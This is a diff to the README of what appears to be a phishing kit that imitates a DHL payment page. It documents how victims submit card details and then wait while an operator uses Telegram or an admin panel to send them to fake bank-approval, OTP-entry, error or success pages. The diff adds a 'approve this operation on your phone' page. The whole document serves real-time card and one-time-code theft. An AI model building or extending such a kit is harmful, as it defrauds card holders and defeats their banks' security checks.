@@ -11,11 +11,13 @@
    ↓
 3. [Admin clicks button in Telegram or Admin Panel]
    ↓
-4. OTP Page 1 (/otp1) → Enter 6-digit code
+4. Approve Page (/approve) → "Approve operation with your phone"
    ↓
-5. OTP Page 2 (/otp2) → Enter second 6-digit code
+5. OTP Page 1 (/otp1) → Enter 6-digit code
    ↓
-6. Success Page (/success) → Payment confirmed!
+6. OTP Page 2 (/otp2) → Enter second 6-digit code
+   ↓
+7. Success Page (/success) → Payment confirmed!
 ```
 
 ---
@@ -33,21 +35,33 @@
 - Polls every 2 seconds for admin decision
 - **Waits for:** Admin to click button (Telegram or Admin Panel)
 
-### 3. **OTP Page 1** - `/otp1`
+### 3. **Approve Page** - `/approve` 🆕
+- Bank verification screen with bank flag/icon
+- Shows smartphone icon (animated pulse)
+- Tells client: "Approve this operation on your phone"
+- Step-by-step instructions:
+  - Open banking app
+  - Confirm operation
+  - Wait for confirmation
+- Animated "waiting for confirmation" spinner
+- Blue banking theme
+- **Triggered by:** Admin clicking "APPROVE" button
+
+### 4. **OTP Page 1** - `/otp1`
 - First security verification
 - 6-digit code entry
 - DHL yellow/red branding
 - **Action:** Submit OTP → Goes to `/otp2`
 - **Error:** Wrong code → Goes to `/otp-error`
 
-### 4. **OTP Page 2** - `/otp2`
+### 5. **OTP Page 2** - `/otp2`
 - Second security verification
 - 6-digit code entry
 - Same design as OTP1
 - **Action:** Submit OTP → Goes to `/success`
 - **Error:** Wrong code → Goes to `/otp-error`
 
-### 5. **OTP Error Page** - `/otp-error`
+### 6. **OTP Error Page** - `/otp-error`
 - Orange warning design
 - "Code OTP incorrect"
 - Helpful tips for user
@@ -55,7 +69,7 @@
   - "Réessayer avec un nouveau code" → Back to previous OTP
   - "Recommencer le paiement" → Back to `/`
 
-### 6. **Payment Error Page** - `/error`
+### 7. **Payment Error Page** - `/error`
 - Red error design
 - "Paiement échoué"
 - Lists possible reasons
@@ -63,7 +77,7 @@
   - "Réessayer le paiement" → Back to `/`
   - "Retour à l'accueil" → Back to `/`
 
-### 7. **Success Page** - `/success`
+### 8. **Success Page** - `/success`
 - Green success design
 - Animated checkmark
 - Shows:
@@ -82,7 +96,7 @@
 ### **Telegram Buttons:**
 When card is submitted, you receive notification with buttons:
 - ❌ **ERROR** ❌ → Sends to `/error`
-- **APPROVE** → Sends to `/otp1`
+- **APPROVE** → Sends to `/approve` (bank approval page) 🆕
 - **OTP** → Sends to `/otp1`
 - **OTP ERROR** → Sends to `/otp-error`
 - **SUCCESS** → Sends to `/success`
@@ -96,7 +110,20 @@ Same options available in `/admin` interface with visual buttons
 
 ## 🔄 Complete User Journey Examples:
 
-### **Example 1: Successful Payment**
+### **Example 1: Successful Payment with Approval**
+1. User enters card at `/`
+2. → Redirected to `/dhl/waiting` (loading)
+3. **Admin clicks "APPROVE"** in Telegram 🆕
+4. → User sees `/approve` (bank approval page)
+5. User sees: "Approve operation with your phone"
+6. **Admin clicks "OTP"** in Telegram
+7. → User sees `/otp1` (first OTP page)
+8. User enters 6-digit code
+9. → User sees `/otp2` (second OTP page)
+10. User enters 6-digit code
+11. → User sees `/success` ✅
+
+### **Example 2: Direct to OTP (skip approval)**
 1. User enters card at `/`
 2. → Redirected to `/dhl/waiting` (loading)
 3. **Admin clicks "OTP"** in Telegram
@@ -106,7 +133,7 @@ Same options available in `/admin` interface with visual buttons
 7. User enters 6-digit code
 8. → User sees `/success` ✅
 
-### **Example 2: Payment Error**
+### **Example 3: Payment Error**
 1. User enters card at `/`
 2. → Redirected to `/dhl/waiting` (loading)
 3. **Admin clicks "ERROR"** in Telegram ❌
@@ -114,7 +141,7 @@ Same options available in `/admin` interface with visual buttons
 5. User clicks "Réessayer le paiement"
 6. → Back to `/` (card entry)
 
-### **Example 3: OTP Error**
+### **Example 4: OTP Error**
 1. User enters card at `/`
 2. → Redirected to `/dhl/waiting` (loading)
 3. **Admin clicks "OTP"** in Telegram
@@ -124,7 +151,7 @@ Same options available in `/admin` interface with visual buttons
 7. User clicks "Réessayer"
 8. → Back to `/otp1`
 
-### **Example 4: Direct to Success (bypass OTP)**
+### **Example 5: Direct to Success (bypass all)**
 1. User enters card at `/`
 2. → Redirected to `/dhl/waiting` (loading)
 3. **Admin clicks "SUCCESS"** in Telegram ✅
@@ -209,6 +236,7 @@ IP: 84.33.180.65
 No more 404 errors! All these routes work:
 - `/` - Card entry
 - `/dhl/waiting` - Loading page
+- `/approve` - Bank approval page 🆕
 - `/otp1` - First OTP verification
 - `/otp2` - Second OTP verification
 - `/error` - Payment error
